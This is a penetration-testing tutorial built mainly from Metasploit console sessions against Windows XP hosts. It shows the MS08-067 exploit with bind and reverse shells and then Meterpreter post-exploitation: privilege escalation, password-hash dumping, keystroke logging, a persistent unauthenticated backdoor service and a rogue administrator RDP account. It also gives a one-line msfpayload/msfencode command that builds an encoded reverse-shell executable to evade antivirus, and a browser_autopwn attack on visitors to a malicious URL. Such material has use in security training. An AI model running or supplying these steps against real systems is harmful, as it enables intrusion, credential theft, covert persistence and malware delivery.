# TARGET EXPLOITATION 

Content is a bit outdated.

The following is a list of online repositories:

	Repository name			Website URL

	Bugtraq SecurityFocus       http://www.securityfocus.com
	OSVDB Vulnerabilities       http://osvdb.org
	Packet Storm                http://www.packetstormsecurity.org
	VUPEN Security              http://www.vupen.com
	National Vulnerability Database   http://nvd.nist.gov
	ISS X-Force                 http://xforce.iss.net
	US-CERT Vulnerability Notes http://www.kb.cert.org/vuls
	US-CERT Alerts              http://www.us-cert.gov/cas/techalerts/
	securiteam                  http://www.securiteam.com
	Government Security Org     http://www.governmentsecurity.org
	Secunia Advisories Security Reason http://secunia.com/advisories/historic/
	http://securityreason.com
	XSSed XSS-Vulnerabilities   http://www.xssed.com
	Security Vulnerabilities Database http://securityvulns.com
	SEBUG                       http://www.sebug.net
	BugReport                   http://www.bugreport.ir
	MediaService Lab            http://lab.mediaservice.net
	Intelligent Exploit Aggregation Network http://www.intelligentexploit.com
	Hack0wn http://www.hack0wn.com




## 1. MSFCONSOLE

The most frequently used commands could be any of the following:

	• show auxiliary : This command will display all the auxiliary modules.
	• show exploits : This command will get a list of all the exploits within the framework.
	• show payloads : This command will retrieve a list of payloads for all platforms. However, using the same command in the context of a chosen exploit will display only compatible payloads. For instance, Windows payloads will only be displayed with the Windows-compatible exploits.
	• show encoders : This command will print the list of available encoders.
	• show nops : This command will display all the available NOP generators.
	• show options : This command will display the settings and options available for the specific module.
	• show targets : This command will help us to extract a list of target OS supported by a particular exploit module.
	• show advanced : This command will provide you with more options to fine-tune your exploit execution.


View specific MSF documentation for more information.


### 1.1 NMAP SCANNING IN MSF

	msf > load db_tracker
	msf > db_nmap -T Aggressive -sV -n -O -v 192.168.0.7

Allows to scan in MSF and store results in database.

To list the target and services discovered, you can issue the db_hosts and db_services commands independently. Additionally, if you have already scanned your target using the Nmap program separately and saved the result in the XML format, you can import these results into Metasploit using the db_import_nmap_xml command.


### 1.2 SNMP community server
 
    msf > search snmp
    [*] Searching loaded modules for pattern 'snmp'...
    ...
    msf > use auxiliary/scanner/snmp/community
    msf auxiliary(community) > show options
    ...
    msf auxiliary(community) > set RHOSTS 10.2.131.0/24
    RHOSTS => 10.2.131.0/24
    msf auxiliary(community) > set THREADS 3
    THREADS => 3
    msf auxiliary(community) > set BATCHSIZE 10
    BATCHSIZE => 10
    msf auxiliary(community) > run
    msf auxiliary(community) > run
    [*] >> progress (10.2.131.0-10.2.131.9) 0/170...
    [*] >> progress (10.2.131.10-10.2.131.19) 0/170...
    [*] >> progress (10.2.131.20-10.2.131.29) 0/170...
    [*] Scanned 030 of 256 hosts (011% complete)
    [*] >> progress (10.2.131.30-10.2.131.39) 0/170...
    [*] >> progress (10.2.131.40-10.2.131.49) 0/170...
    [*] >> progress (10.2.131.50-10.2.131.59) 0/170...
    [*] Scanned 060 of 256 hosts (023% complete)
    [*] >> progress (10.2.131.60-10.2.131.69) 0/170...
    [*] >> progress (10.2.131.70-10.2.131.79) 0/170...
    [*] Scanned 080 of 256 hosts (031% complete)
    [*] >> progress (10.2.131.80-10.2.131.89) 0/170...
    [*] >> progress (10.2.131.90-10.2.131.99) 0/170...
    [*] >> progress (10.2.131.100-10.2.131.109) 0/170...
    [*] 10.2.131.109 'public' 'HP ETHERNET MULTI-ENVIRONMENT,ROM none,JETDIRECT,JD128,EEPROM V.33.19,CIDATE 12/17/2008'
    [*] Scanned 110 of 256 hosts (042% complete)
    ...
    [*] >> progress (10.2.131.240-10.2.131.249) 0/170...
    [*] >> progress (10.2.131.250-10.2.131.255) 0/102...
    [*] Scanned 256 of 256 hosts (100% complete)
    [*] Auxiliary module execution completed

As you can see, we have discovered one SNMP-enabled device with the public community string. Although it enables the read-only access to the device, we can still get valuable information that will be beneficial during the network penetration testing.


### 1.3 VNC blank authentication scanner

This module will scan the range of IP addresses for the Virtual Network Computing (VNC) servers that are accessible without any authentication details as follows:

    msf > use auxiliary/scanner/vnc/vnc_none_auth
    msf auxiliary(vnc_none_auth) > show options
    msf auxiliary(vnc_none_auth) > set RHOSTS 10.4.124.0/24
    RHOSTS => 10.4.124.0/24
    msf auxiliary(vnc_none_auth) > run
    [*] 10.4.124.22:5900, VNC server protocol version : "RFB 004.000",
    not supported!
    [*] 10.4.124.23:5900, VNC server protocol version : "RFB 004.000",
    not supported!
    [*] 10.4.124.25:5900, VNC server protocol version : "RFB 004.000",
    not supported!
    [*] Scanned 026 of 256 hosts (010% complete)
    [*] 10.4.124.26:5900, VNC server protocol version : "RFB 004.000",
    not supported!
    [*] 10.4.124.27:5900, VNC server security types supported : None,
    free access!
    [*] 10.4.124.28:5900, VNC server security types supported : None,
    free access!
    [*] 10.4.124.29:5900, VNC server protocol version : "RFB 004.000",
    not supported!
    ...
    [*] 10.4.124.224:5900, VNC server protocol version : "RFB 004.000",
    not supported!
    [*] 10.4.124.225:5900, VNC server protocol version : "RFB 004.000",
    not supported!
    [*] 10.4.124.227:5900, VNC server security types supported : None,
    free access!
    [*] 10.4.124.228:5900, VNC server protocol version : "RFB 004.000",
    not supported!
    [*] 10.4.124.229:5900, VNC server protocol version : "RFB 004.000",
    not supported!
    [*] Scanned 231 of 256 hosts (090% complete)
    [*] Scanned 256 of 256 hosts (100% complete)
    [*] Auxiliary module execution completed



### 1.4 IIS6 WebDAV unicode auth bypass

This module helps you to determine the authentication bypass vulnerability of IIS6 WebDAV.

    msf > use auxiliary/scanner/http/ms09_020_webdav_unicode_bypass
    msf auxiliary(ms09_020_webdav_unicode_bypass) > show options
    msf auxiliary(ms09_020_webdav_unicode_bypass) > set RHOSTS
    10.8.183.0/24
    RHOSTS => 10.8.183.0/24
    msf auxiliary(ms09_020_webdav_unicode_bypass) > set THREADS 10
    THREADS => 10
    msf auxiliary(ms09_020_webdav_unicode_bypass) > run
    [-] Folder does not require authentication. [302]
    [-] Folder does not require authentication. [400]
    [*] Confirmed protected folder http://10.8.183.9:80/ 401 (10.8.183.9)
    [*]
    Testing for unicode bypass in IIS6 with WebDAV enabled using
    PROPFIND request.
    [-] Folder does not require authentication. [403]
    [-] Folder does not require authentication. [302]
    [-] Folder does not require authentication. [501]
    [-] Folder does not require authentication. [501]
    ...
    [*] Confirmed protected folder http://10.8.183.162:80/ 401
    (10.8.183.162)
    [*]
    Testing for unicode bypass in IIS6 with WebDAV enabled using
    PROPFIND request.
    ...
    [*] Confirmed protected folder http://10.8.183.155:80/ 401
    (10.8.183.155)
    [*]
    Testing for unicode bypass in IIS6 with WebDAV enabled using
    PROPFIND request.
    [*] Confirmed protected folder http://10.8.183.166:80/ 401
    (10.8.183.166)
    [ 259 ]Target Exploitation
    [*]
    Testing for unicode bypass in IIS6 with WebDAV enabled using
    PROPFIND request.
    [*] Confirmed protected folder http://10.8.183.168:80/ 401
    (10.8.183.168)
    [*]
    Testing for unicode bypass in IIS6 with WebDAV enabled using
    PROPFIND request.
    [*] Confirmed protected folder http://10.8.183.167:80/ 401
    (10.8.183.167)
    [*]
    Testing for unicode bypass in IIS6 with WebDAV enabled using
    PROPFIND request.
    [-] Folder does not require authentication. [501]
    [*] Confirmed protected folder http://10.8.183.171:80/ 401
    (10.8.183.171)
    [*]
    Testing for unicode bypass in IIS6 with WebDAV enabled using
    PROPFIND request.
    [-] Folder does not require authentication. [501]
    [-] Folder does not require authentication. [501]
    ...
    [-] Folder does not require authentication. [302]
    [*] Confirmed protected folder http://10.8.183.178:80/ 401
    (10.8.183.178)
    [*]
    Testing for unicode bypass in IIS6 with WebDAV enabled using
    PROPFIND request.
    [-] Folder does not require authentication. [501]
    [-] Folder does not require authentication. [501]
    [*] Scanned 182 of 256 hosts (071% complete)
    [-] Folder does not require authentication. [501]
    [*] Confirmed protected folder http://10.8.183.183:80/ 401
    (10.8.183.183)
    [*]
    Testing for unicode bypass in IIS6 with WebDAV enabled using
    PROPFIND request.
    [-] Folder does not require authentication. [302]
    [*] Confirmed protected folder http://10.8.183.188:80/ 401
    (10.8.183.188)
    [*]
    Testing for unicode bypass in IIS6 with WebDAV enabled using
    PROPFIND request.
    ...
    [-] Folder does not require authentication. [405]
    [*] Scanned 256 of 256 hosts (100% complete)
    [*] Auxiliary module execution completed

Thus, we have successfully validated our target network against the MS09-020 IIS6 WebDAV Unicode Authentication Bypass vulnerability.



### 1.5 Bind shell

A bind shell is a remote shell connection that provides access to the target system on the successful exploitation and execution of shellcode by setting up a bind port listener. This opens a gateway for an attacker to connect back to the compromised machine on the bind shell port using a tool such as Netcat, which could tunnel the standard input ( stdin ) and output ( stdout ) over a TCP connection.

    msf > use exploit/windows/smb/ms08_067_netapi
    msf exploit(ms08_067_netapi) > show options
    msf exploit(ms08_067_netapi) > set RHOST 192.168.0.7
    RHOST => 192.168.0.7
    msf exploit(ms08_067_netapi) > set PAYLOAD windows/shell/bind_tcp
    PAYLOAD => windows/shell/bind_tcp
    msf exploit(ms08_067_netapi) > exploit

    [*] Started bind handler
    [*] Automatically detecting the target...
    [*] Fingerprint: Windows XP Service Pack 2 - lang:English
    [*] Selected Target: Windows XP SP2 English (NX)
    [*] Attempting to trigger the vulnerability...
    [*] Sending stage (240 bytes) to 192.168.0.7
    [*] Command shell session 1 opened (192.168.0.3:41289 -> 192.168.0.7:4444) at Sat Nov 13 19:01:23 +0000 2010
    Microsoft Windows XP [Version 5.1.2600]
    (C) Copyright 1985-2001 Microsoft Corp.
    C:\WINDOWS\system32>



### 1.6 Reverse shell

A reverse shell is completely opposite to a bind shell. Instead of binding a port on the target system and waiting for the connection from attacker's machine, it simply connects back to the attacker's IP and port and spawns a shell. A visible dimension of the reverse shell is to consider a target behind NAT or firewall that prevents public access to its system resources.

    msf > use exploit/windows/smb/ms08_067_netapi
    msf exploit(ms08_067_netapi) > set RHOST 192.168.0.7
    RHOST => 192.168.0.7
    msf exploit(ms08_067_netapi) > set PAYLOAD windows/shell/reverse_tcp
    PAYLOAD => windows/shell/reverse_tcp
    msf exploit(ms08_067_netapi) > show options
    msf exploit(ms08_067_netapi) > set LHOST 192.168.0.3
    LHOST => 192.168.0.3
    msf exploit(ms08_067_netapi) > exploit
    [*] Started reverse handler on 192.168.0.3:4444
    [*] Automatically detecting the target...
    [*] Fingerprint: Windows XP Service Pack 2 - lang:English
    [*] Selected Target: Windows XP SP2 English (NX)
    [*] Attempting to trigger the vulnerability...
    [*] Sending stage (240 bytes) to 192.168.0.7
    [*] Command shell session 1 opened (192.168.0.3:4444 ->
    192.168.0.7:1027) at Sat Nov 13 22:59:02 +0000 2010
    Microsoft Windows XP [Version 5.1.2600]
    (C) Copyright 1985-2001 Microsoft Corp.
    C:\WINDOWS\system32>



### 1.7 Meterpreter

A meterpreter is an advanced, stealthy, multifaceted, and dynamically extensible payload, which operates by injecting a reflective DLL into a target memory. Scripts and plugins can be dynamically loaded at runtime for the purpose of extending the post exploitation activity. This includes privilege escalation, dumping system accounts, keylogging, persistent backdoor service, enabling a remote desktop, and many other extensions. Moreover, the whole communication of the meterpreter shell is encrypted by default.

    msf > use exploit/windows/smb/ms08_067_netapi
    msf exploit(ms08_067_netapi) > set RHOST 192.168.0.7
    RHOST => 192.168.0.7
    msf exploit(ms08_067_netapi) > show payloads
    ...
    msf exploit(ms08_067_netapi) > set PAYLOAD
    windows/meterpreter/reverse_tcp
    PAYLOAD => windows/meterpreter/reverse_tcp
    msf exploit(ms08_067_netapi) > show options
    ...
    msf exploit(ms08_067_netapi) > set LHOST 192.168.0.3
    LHOST => 192.168.0.3
    msf exploit(ms08_067_netapi) > exploit
    [*] Started reverse handler on 192.168.0.3:4444
    [*] Automatically detecting the target...
    [*] Fingerprint: Windows XP Service Pack 2 - lang:English
    [*] Selected Target: Windows XP SP2 English (NX)
    [*] Attempting to trigger the vulnerability...
    [*] Sending stage (749056 bytes) to 192.168.0.7
    [*] Meterpreter session 1 opened (192.168.0.3:4444 ->
    192.168.0.7:1029) at Sun Nov 14 02:44:26 +0000 2010
    meterpreter > help
    ...
    meterpreter > getuid
    Server username: CUSTDESK\salesdept
    meterpreter > use priv
    meterpreter > getsystem -h
    ...

This will display the number of techniques available for elevating our privileges. By using a default command, getsystem , without any options, will attempt every single technique against the target and will stop as soon as it is successful:

    meterpreter > getsystem
    ...got system (via technique 1).
    meterpreter > getuid
    Server username: NT AUTHORITY\SYSTEM
    meterpreter > sysinfo
    Computer: CUSTDESK
    OS : Windows XP (Build 2600, Service Pack 2).
    Arch : x86
    Language: en_US

Let us use the power of the meterpreter shell and dump the current system accounts and passwords held by the target. These will be displayed in the NTLM hash format and can be reversed by cracking through several tools and techniques using the following commands:

    meterpreter > run hashdump
    [*] Obtaining the boot key...
    [*] Calculating the hboot key using SYSKEY 71e52ce6b86e5da0c213566a123
    6f892...
    [*] Obtaining the user list and keys...
    [*] Decrypting user keys...
    [*] Dumping password hashes...
    h
    Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59
    d7e0c089c0:::
    Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c08
    9c0:::
    HelpAssistant:1000:d2cd5d550e14593b12787245127c866d:d3e35f657c924d0b31eb8
    11d2d986df9:::
    SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:c8edf0d0db48cbf7b2
    835ec013cfb9c5:::
    Momin Desktop:1003:ccf9155e3e7db453aad3b435b51404ee:3dbde697d71690a769204
    beb12283678:::
    IUSR_MOMINDESK:1004:a751dcb6ea9323026eb8f7854da74a24:b0196523134dd9a21bf6
    b80e02744513:::
    ASPNET:1005:ad785822109dd077027175f3382059fd:21ff86d627bcf380a5b1b6abe5d8
    e1dd:::
    IWAM_MOMINDESK:1009:12a75a1d0cf47cd0c8e2f82a92190b42:c74966d83d519ba41e51
    96e00f94e113:::
    h4x:1010:ccf9155e3e7db453aad3b435b51404ee:3dbde697d71690a769204b
    eb12283678:::
    salesdept:1011:8f51551614ded19365b226f9bfc33fab:7ad83174aadb77faac126fdd3
    77b1693:::

At this stage, we will migrate the meterpreter shell to the explorer.exe process ( 3172 ) in order to start logging the current user activity on a system using the following commands:

    meterpreter > migrate 3172
    [*] Migrating to 3172...
    [*] Migration completed successfully.

    meterpreter > getuid
    Server username: CUSTDESK\salesdept
    meterpreter > keyscan_start
    Starting the keystroke sniffer...

    meterpreter > keyscan_dump
    Dumping captured keystrokes...
    <Return> www.yahoo.com <Return>
    <Back> www.bbc.co.uk <Return>
    meterpreter > keyscan_stop
    Stopping the keystroke sniffer...

In similar terms, we could also capture the credentials of all users logging in to the system by migrating the winlogon.exe process ( 648 ).

You have exploited and gained access to the target system but now want to keep this access permanent even if the exploited service or application will be patched at a later stage. This kind of activity is typically known as backdoor service. Note that the backdoor service provided by the meterpreter shell does not require authentication before accessing a particular network port on the target system.

    msf exploit(ms08_067_netapi) > exploit
    [*] Started reverse handler on 192.168.0.3:4444
    [*] Automatically detecting the target...
    [*] Fingerprint: Windows XP Service Pack 2 - lang:English
    [*] Selected Target: Windows XP SP2 English (NX)
    [*] Attempting to trigger the vulnerability...
    [*] Sending stage (749056 bytes) to 192.168.0.7
    [*] Meterpreter session 1 opened (192.168.0.3:4444 ->
    192.168.0.7:1032) at Tue Nov 16 19:21:39 +0000 2010
    meterpreter > ps
    ...
    292
    alg.exe
    x86
    C:\WINDOWS\System32\alg.exe
    0
    NT AUTHORITY\LOCAL SERVICE

    1840 csrss.exe x86 2 \??\C:\WINDOWS\system32\csrss.exe NT AUTHORITY\SYSTEM
    528 winlogon.exe x86 2 \??\C:\WINDOWS\system32\winlogon.exe NT AUTHORITY\SYSTEM
    240    rdpclip.exe    x86    0    C:\WINDOWS\system32\rdpclip.exe CUSTDESK\Momin Desktop
    1060 userinit.exe    x86    0    C:\WINDOWS\system32\userinit.exe CUSTDESK\Momin Desktop
    1544 explorer.exe x86 0    C:\WINDOWS\Explorer.EXE CUSTDESK\Momin Desktop
    ...
    meterpreter > migrate 1544
    [*] Migrating to 1544...
    [*] Migration completed successfully.
    meterpreter > run metsvc -h
    ...
    meterpreter > run metsvc
    [*] Creating a meterpreter service on port 31337
    [*] Creating a temporary installation directory
    C:\DOCUME~1\MOMIND~1\LOCALS~1\Temp\oNyLOPeS...
    [*] >> Uploading metsrv.dll...
    [*] >> Uploading metsvc-server.exe...
    [*] >> Uploading metsvc.exe...
    [*] Starting the service...
    * Installing service metsvc
    * Starting service
    Service metsvc successfully installed.

So, we have finally started the backdoor service on our target. We will close the current meterpreter session and use multi/handler with a windows/metsvc_bind_tcp payload to interact with our backdoor service whenever we want.

    meterpreter > exit
    [*] Meterpreter session 1 closed.
    Reason: User exit
    msf exploit(ms08_067_netapi) > back
    msf > use exploit/multi/handler
    msf exploit(handler) > set PAYLOAD windows/metsvc_bind_tcp
    PAYLOAD => windows/metsvc_bind_tcp
    msf exploit(handler) > set LPORT 31337
    LPORT => 31337
    msf exploit(handler) > set RHOST 192.168.0.7
    RHOST => 192.168.0.7
    msf exploit(handler) > exploit
    [*] Starting the payload handler...
    [*] Started bind handler
    [*] Meterpreter session 2 opened (192.168.0.3:37251 ->
    192.168.0.7:31337) at Tue Nov 16 20:02:05 +0000 2010
    meterpreter > getuid
    Server username: NT AUTHORITY\SYSTEM


Let us use another useful meterpreter script, getgui , to enable a remote desktop access for our target. The following exercise will create a new user account on the target and enable remote desktop service if it was disabled previously:

    meterpreter > run getgui -u btuser -p btpass
    [*] Windows Remote Desktop Configuration Meterpreter Script by
    Darkoperator
    [*] Carlos Perez carlos_perez@darkoperator.com
    [*] Language set by user to: 'en_EN'
    [*] Setting user account for logon
    [*] Adding User: btuser with Password: btpass
    [*] Adding User: btuser to local group 'Remote Desktop Users'
    [*] Adding User: btuser to local group 'Administrators'
    [*] You can now login with the created user
    [*] For cleanup use command: run multi_console_command -rc /root/.msf3/logs/scripts/getgui/clean_up__20101116.3447.rc

Now we can login using rdesktop:

    # rdesktop 192.168.0.7:3389

Note that if you already hold a cracked password for any existing user on the target machine, you can simply execute the run getgui -e command to enable the remote desktop service instead of adding a new user. Additionally, do not forget to clean up your tracks on the system by executing the getgui/clean_up script cited at the end of the previous output.


========================

How should I extend my attack landscape by gaining a deeper access to the targeted network that is inaccessible from outside?

Metasploit provides a capability to view and add new routes to the destination network using the route add targetSubnet targetSubnetMask SessionId command (for example, route add 10.2.4.0 255.255.255.0 1). Here the SessionId parameter points to the existing meterpreter session (gateway), and the targetsubnet parameter is another network address (or dual-homed Ethernet network address) that resides beyond our compromised target. Once you set Metasploit to route all the traffic through acompromised host session, we are ready to penetrate further intoa network which is normally non-routable from our side. This terminology is commonly known as pivoting or foot-holding.

========================



## 2. What about the client-side exploitation?

### 2.1 Generating a binary backdoor

See msfvenom cheat sheet & tutorials.

How does Metasploit assist in antivirus evasion?

This is just one example of the many different methods of bypassing or evading an antivirus. Using a tool named msfencode located at /usr/bin/msfencode, we can generate a self-protected executable file with the encoded payload. This should go parallel with the msfpayload file generation process. A raw output from msfpayload will be piped into msfencode to use a specific encoding technique before outputting the final binary. For instance, execute

	msfpayload windows/shell/reverse_tcp LHOST=192.168.0.3 LPORT=32323 R | msfencode -e x86/shikata_ga_nai -t exe > /tmp/tictoe.exe

to generate the encoded version of a reverse shell executable file.
We strongly suggest that you use the stager payloads instead of the inline payloads as they have a greater probability of success in bypassing major malware defenses due to their indefinite code signatures.



### 2.2 Automated browser exploitation

There are situations where you cannot find the clue for exploiting the secure corporate network. In such cases, targeting the employees with electronic or human-assisted social engineering is the only way out. For the purpose of our exercise, we will demonstrate one of the client-side exploitation modules from the Metasploit framework that should support our motive towards a technology-based social engineering attack. Browser autopwn is an advanced auxiliary, which performs web browser fingerprinting against the target visiting our malicious URL. Based on the results, it automatically chooses a browser-specific exploit from the framework and executes it as follows:

    msf > use auxiliary/server/browser_autopwn
    msf auxiliary(browser_autopwn) > show options
    ...
    msf auxiliary(browser_autopwn) > set LHOST 192.168.0.3
    LHOST => 192.168.0.3
    msf auxiliary(browser_autopwn) > set SRVPORT 80
    SRVPORT => 80
    msf auxiliary(browser_autopwn) > set SRVHOST 192.168.0.3
    SRVHOST => 192.168.0.3
    msf auxiliary(browser_autopwn) > set URIPATH /
    URIPATH => /
    msf auxiliary(browser_autopwn) > run
    [*] Auxiliary module execution completed
    [*] Starting exploit modules on host 192.168.0.3...
    [*] ---
    [*] Starting exploit multi/browser/firefox_escape_retval with payload
    generic/shell_reverse_tcp
    [*] Using URL: http://192.168.0.3:80/Eem9cKUlFvW
    [*] Server started.
    [*] Starting exploit multi/browser/java_calendar_deserialize with
    payload java/meterpreter/reverse_tcp
    [*] Using URL: http://192.168.0.3:80/s98jmOiOtmv4
    [*] Server started.
    [*] Starting exploit multi/browser/java_trusted_chain with payload
    java/meterpreter/reverse_tcp
    [*] Using URL: http://192.168.0.3:80/6BkY9uM23b
    [*] Server started.
    [*] Starting exploit multi/browser/mozilla_compareto with payload
    generic/shell_reverse_tcp
    [*] Using URL: http://192.168.0.3:80/UZOI7Y
    [*] Server started.
    [*] Starting exploit multi/browser/mozilla_navigatorjava with payload
    generic/shell_reverse_tcp
    [*] Using URL: http://192.168.0.3:80/jRwlT67KIK6gJE
    ...
    [*] Starting exploit windows/browser/ie_createobject with payload
    windows/meterpreter/reverse_tcp
    [*] Using URL: http://192.168.0.3:80/Xb9Cop7VadNu
    [*] Server started.
    [*] Starting exploit windows/browser/ms03_020_ie_objecttype with
    payload windows/meterpreter/reverse_tcp
    [*] Using URL: http://192.168.0.3:80/rkd0X4Xb
    [*] Server started.
    ...
    [*] Starting handler for windows/meterpreter/reverse_tcp on port 3333
    [*] Starting handler for generic/shell_reverse_tcp on port 6666
    [*] Started reverse handler on 192.168.0.3:3333
    [*] Starting the payload handler...
    [*] Starting handler for java/meterpreter/reverse_tcp on port 7777
    [*] Started reverse handler on 192.168.0.3:6666
    [*] Starting the payload handler...
    [*] Started reverse handler on 192.168.0.3:7777
    [*] Starting the payload handler...
    [*] --- Done, found 15 exploit modules
    [*] Using URL: http://192.168.0.3:80/
    [*] Server started.

  Now as soon as our victim visits the malicious URL ( http://192.168.0.3 ), his or her browser will be detected and the exploitation process will be accomplished accordingly. We can penetrate our target through the client-side exploitation method using the following commands:

    [*] Request '/' from 192.168.0.7:1046
    [*] Request '/' from 192.168.0.7:1046
    [*] Request '/?sessid=V2luZG93czpYUDpTUDI6ZW4tdXM6eDg2Ok1TSUU6Ni4wO1NQMjo
    %3d'
    from 192.168.0.7:1046
    [*] JavaScript Report: Windows:XP:SP2:en-us:x86:MSIE:6.0;SP2:
    [*] Responding with exploits
    [*] Handling request from 192.168.0.7:1060...
    [*] Payload will be a Java reverse shell to 192.168.0.3:7777 from
    192.168.0.7...
    [*] Generated jar to drop (4447 bytes).
    [*] Handling request from 192.168.0.7:1061...
    ...
    [*] Sending Internet Explorer COM CreateObject Code Execution exploit
    HTML to 192.168.0.7:1068...
    [*] Request '/' from 192.168.0.7:1069
    [*] Request '/' from 192.168.0.7:1068
    [*] Request '/' from 192.168.0.7:1069
    [*] Sending EXE payload to 192.168.0.7:1068...
    [*] Sending stage (749056 bytes) to 192.168.0.7

    [*] Meterpreter session 1 opened (192.168.0.3:3333 ->
    192.168.0.7:1072) at Thu Nov 18 02:24:00 +0000 2010
    [*] Session ID 1 (192.168.0.3:3333 -> 192.168.0.7:1072) processing
    InitialAutoRunScript 'migrate -f'
    [*] Current server process: hzWWoLvjDsKujSAsBVykMTiupUh.exe (4052)
    [*] Spawning a notepad.exe host process...
    [*] Migrating into process ID 2788
    [*] New server process: notepad.exe (2788)
    ...
    msf auxiliary(browser_autopwn) > sessions
    Active sessions
    ===============
    Id Type
    Connection Information
    -- ----
    1          meterpreter x86/win32 CUSTDESK\Momin Desktop @ CUSTDESK (ADMIN) 192.168.0.3:3333 -> 192.168.0.7:1072
    msf auxiliary(browser_autopwn) > sessions -i 1
    [*] Starting interaction with 1...
    meterpreter > getuid
    Server username: CUSTDESK\Momin Desktop
